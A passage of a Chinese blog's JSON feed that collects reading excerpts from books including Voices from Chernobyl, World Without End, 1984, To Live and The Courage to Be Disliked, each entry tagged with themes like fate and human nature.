            "content_html": "<p>人民对他们而言就像砂土，只是历史的肥料。</p>\n<h3 id=\"5-39\"><a class=\"markdownIt-Anchor\" href=\"#5-39\">#</a> 5-39</h3>\n<p>我发现自己有多无能为力。所有事物开始瓦解，我的过去再也不能保护我，我找不到答案。以前有，现在没有了。是未来在摧毁我，不是过去。</p>\n<p>没有人知道另一个世界是什么样，这里比较好，我们比较熟悉。</p>\n<p>他们的工作是大声吼叫，我们则是保持安静。</p>\n<p>现在只有死人才能回这里，活人只能趁晚上从森林里溜进来。</p>\n<p>国家乱成一团，很多人回到这里是为了逃避人群和法律，独自生活，连陌生人也是。他们很强悍，眼里看不到一丝友善，喝醉之后很可能放火烧东西。我们睡觉时都把斧头和干草叉放在床底，厨房门边也放了一把锤子。</p>\n<p>我们从来没享受过好日子，生活老是不平静，永远活在恐惧里。打仗之前他们到处抓人，他们开黑色的车来，从田里抓走三个男人，那些人到现在都没回来。我们永远生活在恐惧中。</p>\n<h3 id=\"5-40\"><a class=\"markdownIt-Anchor\" href=\"#5-40\">#</a> 5-40</h3>\n<p>世界仍然一样，但是人不一样了，我不知道人究竟有没有灵魂，如果有，又是什么样？另一个世界怎么容纳得下所有灵魂？</p>\n<p>过去，他们说我们的生活贫穷卑贱，是因为发生过很大的战争，人民深受其害。可是现在我们军力强大，再也没有人敢侵犯我们，没有人能击败我们。但是我们开始自相残杀。</p>\n<p>从前的生活已经过去，我没有力气展开新生活。有人同情我们，也有人讨厌我们。</p>\n<p>我不喜欢黄昏和黑暗，就像现在、光明与黑暗的交界。我不明白这是什么地方，但是那不重要，我活着或者死掉都不重要。人的生命就像草：开花、枯萎，然后被火烧掉。</p>\n<p>我不说话，因为没有人用我可以回答的方式或用我的语言跟我说话，没有人明白我从什么样的地方回来，而且我什么也不能讲。</p>\n<p>我不会批评他们了，我了解他们的想法，他们还很年轻。可是无论如何我都会去，这点我很肯定。</p>\n<p>可是除了我们，没有人知道那里发生了什么事。我们什么都不懂，可是我们什么都看在眼里。</p>\n<p>原来我们都在寻找熟悉的行为模式，希望呈现出那个时刻该有的样子，符合我们记忆中的模样。</p>\n<p>我发现世界 末日时，邪恶的机制也照样运作，人们仍然说三道四，拍大官马屁，大官带着他的电视机和丑陋的技俩，一直到世界末日都是这样，永远是这样。</p>\n<p>我们的艺术都是关于苦难和爱情，但不包括所有生物，只有人类，我们不愿降贵纡尊，动物和植物是另一个世界。在切尔贝诺利，人类不在乎其他生物。</p>\n<h3 id=\"5-41\"><a class=\"markdownIt-Anchor\" href=\"#5-41\">#</a> 5-41</h3>\n<p>虽然发生了难以想象的灾难，人们还是照之前的方式过日子。对他们来说，不能吃自己种的小黄瓜，比切尔贝诺利事件更严重。</p>\n<p>以往我们所认识的敌人，不都被消灭了吗？现在的敌人既看不见又无处不在，是新的邪恶化身。</p>\n<p>人们不相信报纸，电视和广播，而是借观察官员的反应来获得信息，这样的信息较为可靠。</p>\n<p>野生的猫早已集结成群，开始攻击人类。它们想要复仇。它们的记忆已经消失了，它们不记得自己的地位曾在人来之下，曾被人类驯养。对于我们而言，消失的是现实与虚假之间的界限。</p>\n<p>大家都知道这么做徒劳无功，但我么你仍然每天起床做着同样的事。</p>\n<p>我们做好该做的工作，就让那些长官的肩膀再多一颗星把。谁会在乎呢？</p>\n<p>这是我国政治宣传活生生的实例，这里成为专门制造白日梦的工厂。我出现在这里，也算是证明了关于我们的神话：看吧，我们能在各种环境下生存，就算是去过死亡之地也一样。</p>\n<p>我们只生活在梦里，活在高谈阔论里。你一定要在这平凡的生命里增添些什么，才能使一切变得合理，就算在死亡的边缘也一样。</p>\n<p>人民对他们而言就像砂土，只是历史的肥料。</p>\n<p>人们是在这样的教育下长大的。我们是被恐惧和偏见束缚的人民，我们的信仰变成了迷信。</p>\n<p>他们并不是罪犯集团，更应该说是无知和盲从的集体。他们的生活原则，他们从那个大机器那里唯一学来的事，就是不要出风头，大家开心就好。</p>\n<p>如果我们仍在封闭的体制内，仍在铁幕之下，人们恐怕至今还住在反应炉旁边。他们会掩盖一切！</p>\n<h3 id=\"5-42\"><a class=\"markdownIt-Anchor\" href=\"#5-42\">#</a> 5-42</h3>\n<p>我曾经伤心欲绝，曾经不知所措。我想找人谈话，可是找凡人是不够的。我会去教堂，那里很安静，像是在丘陵上一样，安静得让人忘了自己。</p>\n<p>简单和呆板的事实，不见得会比人们模糊的感受，传言和想象更加接近真相。</p>\n",
            "tags": [
                "生命",
                "命运",
                "爱情"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/69%E3%80%8A%E6%97%A0%E5%B0%BD%E4%B8%96%E7%95%8C%E3%80%8B%E8%82%AF%C2%B7%E7%A6%8F%E8%8E%B1%E7%89%B9/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/69%E3%80%8A%E6%97%A0%E5%B0%BD%E4%B8%96%E7%95%8C%E3%80%8B%E8%82%AF%C2%B7%E7%A6%8F%E8%8E%B1%E7%89%B9/",
            "title": "《无尽世界》肯·福莱特",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>不管你说什么或者做什么，我依旧爱着你。</p>\n<h3 id=\"5-64\"><a class=\"markdownIt-Anchor\" href=\"#5-64\">#</a> 5-64</h3>\n<p>你小时候，是父亲的产业供你吃，供你穿，供你上学。等你当了修士，是这个镇子的居民和周围乡村的农民通过缴地租，纳什一税，纳市场摊位费，纳过桥费，还有一大堆的税款，才养活了你们。你一辈子都像是辛苦劳作的人背上的跳骚一样活着。</p>\n<p>卡吕斯连挪动一件家具都不肯，因为换了地方的家具有可能绊倒他。出于同样的担心，他反对一切的变动，因为他不愿应对任何不熟悉的情况。</p>\n<h3 id=\"5-65\"><a class=\"markdownIt-Anchor\" href=\"#5-65\">#</a> 5-65</h3>\n<p>每天都能吃饱，一顿不少，为此付出什么样的牺牲都值得。</p>\n<p>只有上帝是万能的。人只能尽力而为，然后期望最好的结果。</p>\n<p>直到那一刻之前，她一直无意识地以为正常的生活已经结束，她生活在一个恐怖和悲惨的新世界里。现在她意识到，像所有其他事情一样，这种状态也会过去。死去的人会下葬，受伤的人会痊愈，王桥也最终会挣扎着恢复正常。</p>\n<p>他从来没有抱怨过自己的责任，只要承担起来，决不推卸。</p>\n<p>他很高兴每天都这样：他要走同样的小路，坐在同样的位子上，吃饭、祈祷、睡觉都在同样的地方。</p>\n<p>她愿意每天晚上都躺在他身边，随时都可随心所欲的伸出双臂搂住他那瘦削的身体，在她清晨醒来时，在她的肌肤上感受她那双灵巧的双手，生一个他的缩影，成为他俩疼爱和关心的对象。但她不喜欢伴随婚姻而来的那些事情。她想要的是一个爱人而不是主人；她想和他共同生活，却不想把她的生命奉献给他。</p>\n<p>她有嫁给她所爱恋的人的自由–而她却尽其能去找理由不去嫁他。</p>\n<p>凯瑞丝觉得她像是盯视着一副悲剧味道十足的绘画，画中的人物凝固在这一时的戏剧姿势中了，他们的过去和未来只能猜测了。</p>\n<p>她别无选择–只好受制于人。而他也不能出那个圈子一步。</p>\n<p>不管你说什么或者做什么，我依旧爱着你。</p>\n<p>他们不会判断设计–他们要论人行事。</p>\n<p>在阿拉伯世界里，每一件艺术品都留有一点小毛病，就不会和天神的完美竞争了。</p>\n<p>我们都得尽力讨伯爵的欢心，这一点太重要了。</p>\n<h3 id=\"5-66\"><a class=\"markdownIt-Anchor\" href=\"#5-66\">#</a> 5-66</h3>\n<p>整整一个漫长的夏天，她都在掘自己的坟墓。但她还要一如既往。她看到他孤军奋战内心无法忍受。她思考，无论发生什么事，他总会知道，我是那个和他一起奋争的人。这就算是个小小的慰藉吧。</p>\n<p>我们出身贫苦的人只能使点手腕来得到我们想要的东西。顾虑重重是有特权的人才会的。</p>\n<p>走吧，格温达，这地方是不会对我们发慈悲的。</p>\n<p>她曾不止一次地说，她并不知道该对她的生活做点什么，不过她可能没有什么自由的选择。她心里明知这并不是她想做的事情。不过既然已经开始了，她就决心要成功–但她并非命该如此。</p>\n<p>你夺走了我自己作出决定的权利。我是对是错并没有关系。有关系的是该由我而不是由你去决定。</p>\n<p>他是否认定，只要是为了上帝而做，任何欺诈都可以得到原谅。可以肯定的说，为上帝工作的人应该比普通的凡夫俗子更一丝不苟的真诚，而不是相反。</p>\n<p>你把这些人都凑到一起时，你才有了生活。</p>\n<p>她已经失败了，无力的借口只能让她更感到别人在纡尊降贵。</p>\n<p>你要是看不出来，就可能会不为人见地慢慢的暗中害你–而且直到周围的一切全都垮掉之前，你并不知晓。</p>\n<p>他也惊诧，上帝居然利用人的弱点来为他的神圣目的服务。</p>\n<p>可能会有些事情，一时看来完全无害，但对于你今天被告知的事情来说，可能就投射出罪孽的阴影，用成熟地烦死再看，你可能机会感到这些事情并不像初次出现时那样无辜了。</p>\n<p>他意识到，这是可怕的事实。凯瑞丝可能会幸福的。她失去了她的家，她的自由和她的未婚夫；但她最终还可能是幸福的。</p>\n<h3 id=\"5-67\"><a class=\"markdownIt-Anchor\" href=\"#5-67\">#</a> 5-67</h3>\n<p>我们终归是修女啊，我们应该帮助有需要的人，至于我们什么时候该死，还是让上帝决定吧。</p>\n<p>空气中弥漫着一股类似屠宰场的味道，这么多人和马的尸体布满了地面，她们简直绕都绕不开了。她们只好咬紧牙关踩到尸体上去。不久她们的鞋子就沾满了血和泥的混合物。</p>\n<p>这种不幸是不时地会降临到每一个人头上的，就像天气不好和大麦发霉一样。</p>\n<p>她心想，我生你的气，是因为那个分为不值，头脑空空的骚娘们还能让你这么痴呆。</p>\n<p>若是他不被奢侈的生活和肉体的满足所吸引，那他到底想要什么呢？他的家几乎不复存在，只留下了洛拉。但他仍有他的工作。他不打算放弃他所热爱的工作。他从众多人的死亡中逃过一劫，可不是要当闲人的。</p>\n<p>伊丽莎白性格乖戾扭曲，她的怨恨妨碍了她的判断。依凯瑞丝之见，这种人是绝对信不得的：他们总是以偏见为基础来作出他们的决定。</p>\n<p>你像是一个不情愿离开牢房的囚犯，哪怕牢门大敞四开也不跑。</p>\n<p>要是你只说这个而不提别的，你也许会说服我的。</p>\n<p>他把周围的一切，其中包括人，都视为让他得到满足的东西。</p>\n<p>上帝时常拉走好人，而留下坏人活着继续干坏事。</p>\n<p>只要播下怀疑的种子，让他们自行得出结论好了。</p>\n<p>他的愿望，无论在我们无力的头脑中看似多么愚蠢，多么罪过，或多么残忍。我们懦弱而卑微。我们的理解力底下。不该由我们作出决定或选择，我们的职责很简单，那就是服从。</p>\n<p>他们整天都谈着他们的荣誉，其实不值分文–只要合适，他们就会把荣誉丢尽。他们真正的推崇是他们的尊严。他们宁死也不可能受辱。</p>\n<p>要是我们自己都不晓得到哪儿去，就更没有人知道了。</p>\n<h3 id=\"5-68\"><a class=\"markdownIt-Anchor\" href=\"#5-68\">#</a> 5-68</h3>\n<p>我们应该按照我们还要活下去的设想来行动，但实情是我们也不知道。</p>\n<p>上帝的创造太神秘了，不是我们这种人能弄懂的。</p>\n<p>你知道，我原先珍视的一切全都从我这里被夺走了。而当你失去一切的时候，你也就没什么可失去的了。</p>\n<p>每个人都有着不同的人生，每个人的经历都纷繁复杂，都有着跌宕起伏的过去和充满挑战的未来，有着幸福的回忆和难言的忧伤。</p>\n",
            "tags": [
                "命运",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/63%E3%80%8A1984%E3%80%8B%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/63%E3%80%8A1984%E3%80%8B%E4%B9%94%E6%B2%BB%C2%B7%E5%A5%A5%E5%A8%81%E5%B0%94/",
            "title": "《1984》乔治·奥威尔",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>群众的态度无关紧要，只要他们保持不断工作就行。</p>\n<h3 id=\"5-35\"><a class=\"markdownIt-Anchor\" href=\"#5-35\">#</a> 5-35</h3>\n<p>这一部分是对老大哥的英明伟大的赞美，但更多的是一种自我催眠，有意识地用有节奏的闹声来麻痹自己的意识。</p>\n<p>掩饰你真实的感情，控制你脸部的表情，大家做什么你就做什么，这是一种本能的反应。</p>\n<p>他没有这样做，因为他知道这样做没有用。不论他是写了打倒老大哥，还是他没有写，并没有什么不同。不论他是继续写日记，还是他没有继续写，也没有什么不同。思想警察还是会逮到他的。</p>\n<p>他觉得自己好像在海底森林中流浪一样，迷失在一个恶魔的世界中，而自己就是其中的一个恶魔。他孤身一人。过去已经死亡，未来无法想象。</p>\n<p>如果别人都相信党说的谎话–如果所有记录都这么说–那么这个谎言也将载入历史而称为真理。</p>\n<p>知与不知，知道全部真实情况而却扯一些滴水不漏的谎话，同时持两种互相抵消的观点，明知他们互相矛盾而仍都相信，用逻辑来反逻辑，一边表示拥护道德，一边又否定道德，一边相信民主是办不到的一边又相信党是民主的捍卫者，忘掉一切必须忘掉的东西而又在需要的时候想起他来，然后又马上忘掉他。</p>\n<h3 id=\"5-36\"><a class=\"markdownIt-Anchor\" href=\"#5-36\">#</a> 5-36</h3>\n<p>温斯顿看着那张没有眼睛的脸上的嘴巴忙个不停的一张一合，心中有一个奇怪的感觉，觉得这不是一个真正的人，而是一种假人。说话的不是那个人的脑子，而是他的喉头。说出来的东西虽然是用词儿组成，但不是真正的话。而是在无意识状态中发出来的叫声，像鸭子呱呱叫一样。</p>\n<p>不论什么大吵大闹或者能够使自己感到疼痛的事情，只要能够使他忘却那不断折磨他的记忆，他都想做。</p>\n<p>她毫无例外地是他所遇到过的人中头脑最愚蠢、庸俗、空虚的人。她的头脑里没有一个思想不是口号，只要是党告诉她的蠢话，她没有，绝对没有不盲目相信的。</p>\n<p>通过早期的周密的灌输，通过游戏和冷水浴，通过在学校里、少年侦察队里和青年团里不断向她们灌输的胡说八道，通过讲课、游行、歌曲、口号、军乐等等，她们的天性早已被扼杀得一干二净。</p>\n<p>你看看四周，就可以看到现在的生活同电幕上滔滔不绝的谎言毫无共同之处，而且同党要想达到的理想也无共同之处。</p>\n<p>党所树立的理想确是一种庞大、可怕、闪闪发光的东西，到处是一片钢筋水泥，庞大机器和可怕武器，个个是骁勇的战士和狂热的信徒，团结一致的前进，大家都思想一致，口号一致，始终不懈地在努力工作、战斗、取胜、迫害–三亿人民都是一张面孔。</p>\n<p>电幕夜以继日地在你的耳边聒噪着一些统计数字，证明今天人们比五十年前吃的好，穿的暖，住的宽敞，玩得痛快。但没有一句话可以证明是对的或是不对的。像两个未知数的简单等式。</p>\n<p>他们的哲学不仅不言而喻地否认经验的有效性，而且否认客观现实的存在。常识成了一切异端中的异端。毕竟，我们怎么知道二加二等于四呢？怎么知道地心引力发生作用呢？怎么知道过去是不可改变的呢？如果过去和客观世界只存在于意识中，而意识又是可以控制的–那怎么办？</p>\n<h3 id=\"5-37\"><a class=\"markdownIt-Anchor\" href=\"#5-37\">#</a> 5-37</h3>\n<p>在中心度过这个冗长喧闹的夜晚，玩那些令人厌倦吃力的游戏，听那些报告讲话，靠杜松子酒维持勉强的同志关系，都让他无法忍受。</p>\n<p>可以这么说，对好几百万无产者来说，彩票如果不是他们仍然活着的唯一理由，也是主要的理由。这是他们的人生乐趣，他们的一时荒唐，他们的止痛药，他们的脑力刺激剂。</p>\n<p>他们就像蚂蚁一样，可以看到小东西，却看不到大的。在记忆不到而书面记录又经篡改伪造的这样的情况下，常声称已改善了人民的生活，你就得相信，因为不存在，也永远不会存在任何可以测定的比较标准。</p>\n<p>他想到碰到危急状态，你要对付的从来不是那个外部的敌人，而是自己的身体。</p>\n<p>他想到她的赤裸的、年轻的肉体，像在梦中见到的那样。他原来以为她像别人一样是个傻瓜，头脑里尽是些谎言和仇恨，肚子里尽是些冰块。</p>\n<p>在我们参加的这场比赛里，我们是无法取胜的。只不过有几种失败比另几种失败好一些，仅此而已。</p>\n<p>实际生活中是没有出路的。甚至那唯一切实可行的办法，即自杀，他们也无意实行。过一天算一天，过一星期算一星期，虽然没有前途，却还是尽量拖长现在的时间，这似乎是一种无法压制的本能，就像只要有空气，肺部总要呼吸一样。</p>\n<p>他没有麻木不仁。他仍保有原始的感情。而他自己却是需要作出有意识的努力才能重新学会这段感情。</p>\n<p>不管我做什么，说什么，或者不说什么，都不会推迟你的死亡。我们不会知道对方是死是活。我们将完全束手无策，有一点重要的，那就是我们不要出卖对方，尽管这一点也不会造就任何不同。</p>\n<h3 id=\"5-38\"><a class=\"markdownIt-Anchor\" href=\"#5-38\">#</a> 5-38</h3>\n<p>这是不可避免的，这是我们必须毫不犹豫地该做的事，但是等到生活值得我们好好过时，我们就不干这种事了。</p>\n<p>群众的态度无关紧要，只要他们保持不断工作就行。</p>\n<p>每一个国家实际上都是个单独的天地，怎么样颠倒黑白，混淆是非，都没有任何的关系。</p>\n<p>不论财富的增长，或态度的缓和，或改革和革命，都没有使人类接近平等一步。从下等人的观点来看，历史若有变化，大不了是主子名字改变而已。</p>\n<p>群众从来不会自动起来造反，他们从来不会由于你身受压迫而起来造反。说真的，只要不给他们比较的标准，他们从来不会意识到自己正在所受的压迫。</p>\n<p>你不去惹他们，他们就会一代又一代地，一个世纪又一个世纪地做工，繁殖、死亡，不仅没有造反的冲动，而且也没有能力理解可以有一个不同于目前世界的世界。</p>\n<p>群众有什么看法，或者没有什么看法，已被视为无足轻重的事。因为他们没有智力，所以不妨给予他们学术自由。</p>\n<p>这一原则认为，过去并不客观存在，它只存在于文字记录和人的记忆中。凡是记录和记忆一致的东西，即为过去。</p>\n<p>天空下面的人基本上是一样的人–全世界到处都是一样，几亿，几十亿的人，都不知彼此的存在，被仇恨和谎言的高墙隔开，但几乎是完全一样的人–这些人从来不知道怎样思想。</p>\n<p>你不愿为神智健全付出顺从的代价。你宁可做个疯子，光棍少数派。</p>\n<p>我认为我是存在的。我意识到我自己的存在。我生了下来，我还会死去。我有胳膊有腿。我占据一定的时间。没有别的实在的东西能够同时占据我所占据的空间。</p>\n<h3 id=\"5-39\"><a class=\"markdownIt-Anchor\" href=\"#5-39\">#</a> 5-39</h3>\n<p>他知道世界究竟怎么一回事，人类生活堕落到了什么成都，当用什么谎话和野蛮手段使他们处于那种地位。加以权衡，但这都无关紧要，因为为了最终目的，一切手段都是正当的。</p>\n<p>这是一个恐惧，叛卖，折磨的世界，一个践踏和被践踏的世界，一个在致力于完善的过程中越来越无情的世界。</p>\n<p>你必须始终知道有这个秘密在那里，但是非到需要的时候，你绝不可以让他用任何一种可以叫上的一个名称的形状出现在你的意识之中，从今以后，他不仅需要正确思想，而且要正确感觉，正确做梦。在这期间，他要始终把他的仇恨锁在心中，成为自己身体的一部分。</p>\n<p>他端起酒杯，闻了一下，这玩意一口比一口难喝。但是这已成了他所沉溺的因素。这是他的生命，他的死亡，他的复活。他靠杜松子酒每晚沉醉如死，他靠杜松子酒每天清晨醒过来。</p>\n<p>他现在不再跑，也不再叫了。他又回到了友爱部，一切都已原谅，他的灵魂洁白如雪。他站在被告席上，什么都招认，什么人都咬。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/7%E3%80%8A%E6%B4%BB%E7%9D%80%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/7%E3%80%8A%E6%B4%BB%E7%9D%80%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "title": "《活着》余华",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>夜里黑乎乎的，风吹在我的脸上，我和死去的儿子说说话，声音飘来飘去都不像我的。</p>\n<h3 id=\"2-117\"><a class=\"markdownIt-Anchor\" href=\"#2-117\">#</a> 2-117</h3>\n<p>人是为活着本身而活着的，而不是为活着之外的任何事物所活着。</p>\n<p>他们向我微笑时，我看到空洞的嘴里牙齿所剩无几。他们时常流出混浊的眼泪，这倒不是因为他们时常悲伤，他们在高兴时甚至是在什么事都没有的平静时刻，也会泪流而出。</p>\n<p>也许是困苦的生活损坏了他们的记忆，面对往事他们通常也显得木讷，常常以不知所措的微笑搪塞过去。他们对自己的经历缺乏热情，仿佛是道听途说般地只记得零星几点，即使是这零星几点，也都是自身之外的记忆。</p>\n<h3 id=\"2-118\"><a class=\"markdownIt-Anchor\" href=\"#2-118\">#</a> 2-118</h3>\n<p>人要是累的整天没力气，就不会去乱想了。日子又苦又累，心里反倒踏实了。</p>\n<p>就是全家都饿死，也不送风霞回去。</p>\n<p>是灾祸找到他，不能说是我们推给他的。</p>\n<p>为了他念书，风霞都送给过别人，家珍都病成这样也没让他退学，他嘻嘻哈哈的跑到课堂上来玩了！</p>\n<p>羊是最养人的，能肥田，到了春天剪了羊毛还能卖钱，再说也是为了有庆，要是给这孩子买一头羊羔回来，他不知道会有多高兴。</p>\n<p>有庆，有庆，快回家去喝粥。</p>\n<p>福贵，我不想死，我想每天都能看到你们。</p>\n<p>夜里黑乎乎的，风吹在我的脸上，我和死去的儿子说说话，声音飘来飘去都不像我的。</p>\n<p>我一个人在屋外坐到天快亮的时候，先是呜呜的哭，哭了一阵我就开始想从前的事，想着想着又掉出了眼泪，这日子过得真是快，家珍嫁给我以后一天好日子都没过上，眼睛一眨就到了他要去的时候了。</p>\n<p>二喜是个实在人，心眼好，把风霞给他，我心里踏实。</p>\n",
            "tags": [
                "生命",
                "命运",
                "社会"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/70%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B%E5%B2%B8%E8%A7%81%E4%B8%80%E9%83%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/70%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B%E5%B2%B8%E8%A7%81%E4%B8%80%E9%83%8E/",
            "title": "《被讨厌的勇气》岸见一郎",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>重要的不是被给予了什么， 而是如何去利用被给予的东西。</p>\n<h3 id=\"x-1\"><a class=\"markdownIt-Anchor\" href=\"#x-1\">#</a> x-1</h3>\n<p>如果是在宗教盛行的时代，人们也还有救。那时，神的旨意就是真理、 就是世界、就是一切，只要遵从神的旨意，需要思考的课题也就很少。但现在宗教 失去了力量，人们对神的信仰也趋于形式化。没有任何可以信赖的东西，人人都充满了不安和猜忌，大家都只为自己而活，这就是所谓的现代社会。</p>\n<p>人并不是住在客观的世界，而是住在自己营造的主观世界里。你所看到 的世界不同于我所看到的世界，而且恐怕是不可能与任何人共有的世界。</p>\n<p>也许你是在透过墨镜看世界，这样看到的世界理所当然就会变 暗。如果真是如此，你需要做的是摘掉墨镜，而不是感叹世界的黑暗。摘掉墨镜之后看到的世界也许会太过耀眼，而使你禁不住闭上眼睛。或许你又会想念墨镜。即便如此，你依然能够摘掉墨镜吗？你能正视这个世界吗？你有这种” 勇气 “吗？</p>\n<p>他很希望到外面去，如果可以的话还想要像正常人一样拥有份工作。他 “很想 改变” 目前的自己。作为朋友我可以担保他是一位非常认真并且对社会有用的男 人。但是，他非常害怕到房间外面去。只要踏出房间一步马上就会心悸不已、手脚发抖。</p>\n<p>如果一味地关注过去的原因，企图仅仅靠原因去解释事物，那就会陷入 “决定论”。也就是说，最终会得出这样的结论：我们的现在甚至末来全部都由过去的事情所决定，而且根本无法改变。</p>\n<p>任何经历本身并不是成功或者失败的原因。我们并非因为自身经历中的刺激 —— 所谓的心理创伤 —— 而痛苦，事实上我们会从经历中发现符合自己目的的因素。决定我们自身的不是过去的经历，而是我们自己赋予经历的意义。</p>\n<p>关键是经历本身不会决定什么。我 们给过去的经历 “赋予了什么样的意义”，这直接决定了我们的生活。人生不是由 别人赋予的，而是由自己选择的，是自己选择自己如何生活。</p>\n<p>他心有不满，而且也并不幸福。但是，他的确是按照 “目的” 而采取的行动。不仅仅是他，我们大家都是在为了某种 “目的” 而活着。这就是目的论。</p>\n<h3 id=\"x-2\"><a class=\"markdownIt-Anchor\" href=\"#x-2\">#</a> x-2</h3>\n<p>所谓愤怒其实只是可放可收的一种 “手段” 而已。 它既可以在接电话的瞬间巧妙地收起，也可以在挂断电话之后再次释放出来。那位母亲并不是因为怒不可遏而大发雷霆，她只不过是为了用高声震慑住女儿，进而使其听自己的话才采用了愤怒这种感情。</p>\n<p>说问题不在于 “发生了什么”，而在于 “如何诠释”。我们不可能乘坐时光机器回到过去，也不可能让时针倒转。 如果你成了原因论的信徒，那就会在过去的束缚之下永远无法获得幸福。</p>\n<p>为什么那么急于得到答案呢？答案不应该是从别人那里得到，而应该是自己亲自找出来。从别人那里得到的答案只不过是对症疗法而己，没有什么价值。</p>\n<p>是的，的确如此！我承认我很讨厌自己！讨厌像现在这样与先生您讨 论落伍哲学的自己！也讨厌不得不这样做的自己！</p>\n<p>重要的不是被给予了什么， 而是如何去利用被给予的东西。</p>\n<p>现在你感觉不到幸福。有时还会觉得活得很痛苦，甚至想要变成别人。但是，现在的你之所以不幸正是因为你自己亲手选择了 “不幸”，而不是因为生来就不幸。。</p>\n<p>某人如何看 “世界”，又如何看 “自己”，把这些 “赋予意义的方 式” 汇集起来的概念就可以理解为生活方式。从狭义上来讲可以理解为性格：从广 义上来说，这个词甚至包含了某人的世界观或人生观。</p>\n<p>实际上，他是想通过不去比赛这一方式来保留一种 “如果做的话我也可以” 的可能性，即不愿出去被人评价，更不愿去面对因作品拙劣而落选的现实。他只想活在 “只要有时间我也可以、只要环境具备我也能写、自己有这种才能” 之类的可能性中。或许再过 5 年或者 10 年， 他又会开始使用 “已经不再年轻” 或 者 “也已经有了家庭” 之类的借口。</p>\n<p>应该去做 —— 这一简单的课题摆在面前，但却不断地扯出各种 “不能做的理由”，你难道不认为这是一种很痛苦的生活方式吗？梦想着做小说家的他，正是 “自己” 把人生变得复杂继而难以获得幸福。</p>\n<h3 id=\"x-3\"><a class=\"markdownIt-Anchor\" href=\"#x-3\">#</a> x-3</h3>\n<p>无论之前的人生发生过什么， 都对今后的人生如何度过没有影响。决定自己人生的是活在 “此时此刻” 的你自己。</p>\n<p>但是，只要有脸红恐惧症存在，她就可以用 “我之所以不能和他交往都是因为这个脸红恐惧症” 这样的想法来进行自我逃避，如此便可以不必鼓起告白的勇气或 者即使被拒绝也可以说服自己；而且，最终也可以抱着 “如果治好了脸红恐惧症我 也可以……” 之类的想法活在幻想之中。</p>\n<p>你为什么讨厌自己呢？为什么只盯着缺点就是不肯去喜欢自己呢？ 那是因为你太害怕被他人讨厌、害怕在人际关系中受伤。就像有脸红恐惧症的她害怕被男性拒绝一样，你也很害怕被他人否定。 害怕被别人轻视或拒绝、害怕心灵受伤。你认为与其陷入那种窘境倒还不如一开始 就不与任何人有关联。也就是说，你的 “目的” 是 “避免在与他人的关系中受伤”。</p>\n<p>“要想消除烦恼，只有一个人在宇宙中生存”。但是，那种事情根本就无法做到。</p>\n<p>如果只有一个人活在宇宙中的话，恐怕连孤独这个概念都不会存在。既不需要语言，也不需要逻辑和常识（共通感觉）。但是，这种事情根本不可能发生。即使是在无人岛上生活，也会想到遥远的海对岸的 “某人”；即使在一个人的夜晚，也会侧耳静听某人 睡眠中的呼吸声。只要在某个地方存在着那个某人，孤独就会袭来。</p>\n<p>你由于太惧怕人际关系所以才会变得讨厌自己，你是在通过自我厌弃来逃避人际关系。</p>\n<p>在报纸上看到同龄人活跃的姿态时，我就会感到极其自卑。生活 在同一时代的人那么活跃，而自己究竟在做什么呢；或者是看到朋友过得幸福，不是想要祝福而是心生嫉妒或者非常焦躁。当然，我也不喜欢自己这张满是粉刺的脸，对于学历、职业以及年收入等社会境况也抱有强烈的自卑感。哎呀，总之就是哪里都很自卑。</p>\n<p>问题在于你如何去面对这种社会现实。如果抱着 “我因为学历低所以无法成功” 之类的想法，那就不是 “不能成功” 而是 “不想成功” 了。害怕向前迈进或者是不想真正地努力。不愿意为了改变自我而牺牲目前所享受的乐趣 —— 比如玩乐或休闲时间。也就是拿不出改变生活方式 的 “勇气”，即使有些不满或者不自由，也还是更愿意维持现状。</p>\n<h3 id=\"x-4\"><a class=\"markdownIt-Anchor\" href=\"#x-4\">#</a> x-4</h3>\n<p>借助权势的力量来抬高自己的人终究是活在他人的价值观和人生 之中。这是必须重点强调的地方。</p>\n<p>健全的自卑感不是来自与别人的比较，而是来自与 “理想的自己” 的比较。</p>\n<p>无论是走在前面还是走在后面都没有关系，我们都走在一个并不 存在纵轴的水平面上，我们不断向前迈进并不是为了与谁竞争。价值在于不断超越自我。</p>\n<p>那个人已经下定决心要找机会” 结束这种关系 “，继而正在搜集结束关系的材料，所以才会那样感觉。对方其实没有任何改变，只是自己的” 目的 “变了而已。人就是这么任性而自私的生物，一旦产生这种想法，无论怎样都能发现对方的缺点。即使对方是圣人君子一样的人物，也能够轻而易举地找到对方值得讨厌的理由。正因为如此，世界才随时可能变成危险的所在，人们也就有可能把所有他人都看成” 敌人 “。</p>\n<p>是的，我对你的过去一无所知，有关你父母和你哥哥的事情我也一无所知。不过，我只知道一点。决定你的生活方式（人生状态）的不是其他任何人，而是你自己这一事实。</p>\n<p>你不是为了满足别人的期待而活着，我也不是为了满足别人的期待而活 着。我们没必要去满足别人的期待。</p>\n<p>如果一味寻求别人的认可、在意别人的评价，那最终就会活在别人的人生中。</p>\n<p>一切人际关系矛盾都起因于对别人的课题妄加干涉，或者自己 的课题被别人妄加干涉。只要能够进行课题分离，人际关系就会发生巨大改变。</p>\n<p>倘若无视本人的意愿而强迫 其 “改变”，那结果只会是日后产生更加强烈的反作用。</p>\n<p>干涉甚至担负起别人的课题这会让自己的人生沉重而痛苦。如果你正在为自己的人生而苦恼 —— 这种苦恼源于人际关系 —— 那首先请弄清楚 